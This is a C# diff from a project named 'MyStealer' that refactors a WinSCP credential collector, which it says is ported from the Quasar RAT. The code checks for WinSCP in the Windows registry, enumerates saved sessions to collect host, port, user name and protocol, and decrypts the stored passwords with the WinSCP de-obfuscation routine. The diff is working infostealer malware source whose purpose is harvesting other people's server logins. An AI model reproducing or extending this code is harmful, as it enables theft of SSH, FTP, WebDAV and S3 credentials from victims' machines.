@@ -1,5 +1,4 @@
 ﻿using Microsoft.Win32;
-using Serilog;
 using System;
 using System.Collections.Generic;
 using System.Collections.Immutable;
@@ -7,22 +6,33 @@ using System.IO;
 using System.Linq;
 using System.Text;
 
-namespace MyStealer.Collectors.FtpClient
+namespace MyStealer.Collectors.Client
 {
     /// <summary>
     /// Ported from Quasar RAT
     /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
     /// </summary>
-    internal class WinScp : IFtpClientCollector
+    internal class WinScp : ClientCollector
     {
-        public virtual string ApplicationName => "WinScp";
+        public override string ModuleName => "WinSCP";
 
-        private ILogger lazyLogger;
-        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
-
-        public IImmutableSet<CredentialEntry> GetCredentials()
+        public override bool IsAvailable()
         {
-            var set = ImmutableHashSet.CreateBuilder<CredentialEntry>();
+            try
+            {
+                using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
+                using (var dataKey = baseKey?.OpenSubKey(Path.Combine("Software", "Martin Prikryl", "WinSCP 2")))
+                    return dataKey != null;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public override IImmutableSet<ClientLogin> GetLogins()
+        {
+            var set = ImmutableHashSet.CreateBuilder<ClientLogin>();
 
             using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
             {
@@ -38,41 +48,47 @@ namespace MyStealer.Collectors.FtpClient
 
                 using (var key = baseKey.OpenSubKey(Path.Combine("Software", "Martin Prikryl", "WinSCP 2", "Sessions")))
                 {
-                    foreach (var subkey in key.GetSubKeyNames())
+                    foreach (var sessionKeyName in key.GetSubKeyNames())
                     {
-                        using (var accountKey = key.OpenSubKey(subkey))
+                        using (var sessionKey = key.OpenSubKey(sessionKeyName))
                         {
-                            var host = accountKey.GetValue("HostName")?.ToString();
+                            var host = sessionKey.GetValue("HostName")?.ToString();
                             if (string.IsNullOrEmpty(host))
                                 continue;
 
-                            host += accountKey.GetValue("PortNumber")?.ToString() ?? "22";
+                            host += sessionKey.GetValue("PortNumber")?.ToString() ?? "22";
 
-                            var userName = accountKey.GetValue("UserName")?.ToString();
+                            var userName = sessionKey.GetValue("UserName")?.ToString();
                             if (string.IsNullOrEmpty(userName))
                                 continue;
 
                             // From metasploit-framework Rex::Parser::WinSCP
-                            var protocolId = int.Parse(accountKey.GetValue("FSProtocol")?.ToString() ?? "-1");
-                            string protocol;
+                            var protocolId = int.Parse(sessionKey.GetValue("FSProtocol")?.ToString() ?? "-1");
+                            LoginProtocol protocol;
                             switch (protocolId)
                             {
                                 case 0:
-                                    protocol = "SSH";
+                                    protocol = LoginProtocol.SSH;
                                     break;
                                 case 5:
-                                    protocol = "FTP";
+                                    protocol = LoginProtocol.FTP;
+                                    break;
+                                case 6:
+                                    protocol = LoginProtocol.WebDAV;
+                                    break;
+                                case 7:
+                                    protocol = LoginProtocol.AmazonS3;
                                     break;
                                 default:
-                                    protocol = "Unknown";
+                                    protocol = LoginProtocol.None;
                                     break;
                             }
 
                             var password = "";
                             if (decryptPass)
-                                password = WinScpDecrypt(host, userName, accountKey.GetValue("Password")?.ToString());
+                                password = WinScpDecrypt(host, userName, sessionKey.GetValue("Password")?.ToString());
 
-                            var keyfile = accountKey.GetValue("PublicKeyFile")?.ToString();
+                            var keyfile = sessionKey.GetValue("PublicKeyFile")?.ToString();
                             if (!string.IsNullOrEmpty(keyfile))
                             {
                                 password = "Certificate: " + keyfile;
@@ -83,10 +99,10 @@ namespace MyStealer.Collectors.FtpClient
                                 }
                             }
 
-                            set.Add(new CredentialEntry
+                            set.Add(new ClientLogin
                             {
-                                ApplicationName = ApplicationName,
-                                ApplicationProfileName = "",
+                                ProgramName = ModuleName,
+                                Name = sessionKeyName,
                                 Protocol = protocol,
                                 Host = host,
                                 UserName = userName,
@@ -100,15 +116,15 @@ namespace MyStealer.Collectors.FtpClient
             return set.ToImmutable();
         }
 
-        private int DecryptNextChar(List<string> list)
-        {
-            var a = int.Parse(list[0]);
-            var b = int.Parse(list[1]);
-            return 255 ^ (((a << 4) + b) ^ 0xA3) & 0xff;
-        }
-
         private string WinScpDecrypt(string host, string user, string pass)
         {
+            int DecryptNextChar(List<string> list)
+            {
+                var a = int.Parse(list[0]);
+                var b = int.Parse(list[1]);
+                return 255 ^ ((a << 4) + b ^ 0xA3) & 0xff;
+            }
+
             try
             {
                 if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
